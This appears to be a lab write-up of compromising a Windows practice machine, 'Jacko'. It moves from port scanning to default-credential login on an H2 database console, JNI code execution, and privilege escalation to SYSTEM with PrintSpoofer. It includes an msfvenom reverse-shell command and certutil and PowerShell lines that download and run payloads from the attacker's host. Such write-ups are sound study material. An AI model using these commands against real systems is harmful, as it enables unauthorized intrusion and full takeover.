---
Alias: Jacko
Date: 6/30/2022
Platform: Windows
Difficulty: Intermediate
Tags:
Status: Finished
IP: 192.168.172.66 
---

# {{Jacko}}


# Resolution summary
- Navigated to target ip via port 8082
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- nmap
- gobuster

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan -a 192.168.172.66 --ulimit 5000                                                                    (master✱) 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.172.66:80
Open 192.168.172.66:135
Open 192.168.172.66:139
Open 192.168.172.66:445
Open 192.168.172.66:8082
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 22:57 EDT
Initiating Ping Scan at 22:57
Scanning 192.168.172.66 [2 ports]
Completed Ping Scan at 22:57, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:57
Completed Parallel DNS resolution of 1 host. at 22:57, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:57
Scanning 192.168.172.66 [5 ports]
Discovered open port 445/tcp on 192.168.172.66
Discovered open port 135/tcp on 192.168.172.66
Discovered open port 80/tcp on 192.168.172.66
Discovered open port 139/tcp on 192.168.172.66
Discovered open port 8082/tcp on 192.168.172.66
Completed Connect Scan at 22:57, 0.08s elapsed (5 total ports)
Nmap scan report for 192.168.172.66
Host is up, received syn-ack (0.086s latency).
Scanned at 2022-06-22 22:57:46 EDT for 0s

PORT     STATE SERVICE         REASON
80/tcp   open  http            syn-ack
135/tcp  open  msrpc           syn-ack
139/tcp  open  netbios-ssn     syn-ack
445/tcp  open  microsoft-ds    syn-ack
8082/tcp open  blackice-alerts syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds

sudo nmap -sC -sV 192.168.143.66 -p 80,135,139,445,8082                                                                        (master✱) 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-23 14:10 EDT
Nmap scan report for 192.168.143.66
Host is up (0.083s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-06-23T18:10:49
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.99 seconds
```

Enumerated open TCP ports:
```bash
8082

```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 8082 - H2 database http console

#### - Navigated to "http://192.168.195.66:8082" and found the following:

![](Pasted%20image%2020221014085548.png)

#### -Googled "H2 database http console default credentials" and found the following showing username "sa" and password is blank:
![](Pasted%20image%2020221014085635.png)
![](../Images/Pasted%20image%2020220628031841.png)

#### -Logged into the following H2 database with username "sa" and password left as blank and found the following web page:

![](Pasted%20image%2020221014211701.png)

![](Pasted%20image%2020221014211810.png)


---

# Exploitation
## H2 Database 1.4.199 - JNI Code Execution


#### -Googled "H2 database http console exploit" and found the following exploit via the exploit-db webpage:

![](Pasted%20image%2020221014211903.png)

![](Pasted%20image%2020221014211954.png)

![](Pasted%20image%2020221014212038.png)

#### - Copied and pasted everything from the line below "-- Write native library" from the exploit code into the H2A database

#### - Copied and pasted everything from the line below "-- Load native library" from the exploit code into the H2A database

#### - Copied and pasted everything from the line below "-- Evaluate script" from the exploit code into the H2A database

#### - Found we had code execution with command "whoami"

![](Pasted%20image%2020221014212352.png)

#### - Found  target machine was running on x64 architecture:

![](Pasted%20image%2020221014212446.png)

#### - Typed "msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=[Kali IP] LPORT=8082" on my kali machine to setup a reverse shell payload

#### - Setup a ncat listener on my kali machine listening on port 8082

#### - Typed "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://[Kali IP]/shell.exe C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');" on the H2 console in order to download the payload to the target machine

#H2DatabaseConsoleCommandExecutionPayload 


#### - Typed "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');" and clicked run and received a reverse shell:

![](Pasted%20image%2020221015164556.png)

---

# Privilege Escalation
## Local Enumeration
#### - Navigated to "C:\Windows\system32" and typed "whoami.exe /priv" and found SeImpersonatePrivilege was enabled:
![](Pasted%20image%2020221015184540.png)
#SeImpersonatePrivilege 

#### - Typed "systeminfo.exe" and found the target machine was running on a x64 bit architecture:
![](Pasted%20image%2020221015185752.png)


## Privilege Escalation vector
## SeImpersonatePrivilege Escalation

#### - Downloaded a precompiled printspoofer64.exe onto my kali machine

#### -Hosted the printspoofer64.exe file on my kali machine and transferred the file to the target machine by typing "(new-object System.Net.WebClient).DownloadFile('http://[Kali IP]/PrintSpoofer64.exe','c:\Users\tony\PrintSpoofer64.exe') (new-object System.Net.WebClient).DownloadFile('http://192.168.49.114/PrintSpoofer64.exe','c:\Users\tony\PrintSpoofer64.exe')" while in powershell:

![](Pasted%20image%2020221015185846.png)

#### -Typed "./PrintSpoofer64.exe -i -c cmd" and received a shell running as nt authority\system:
![](Pasted%20image%2020221015185953.png)


---

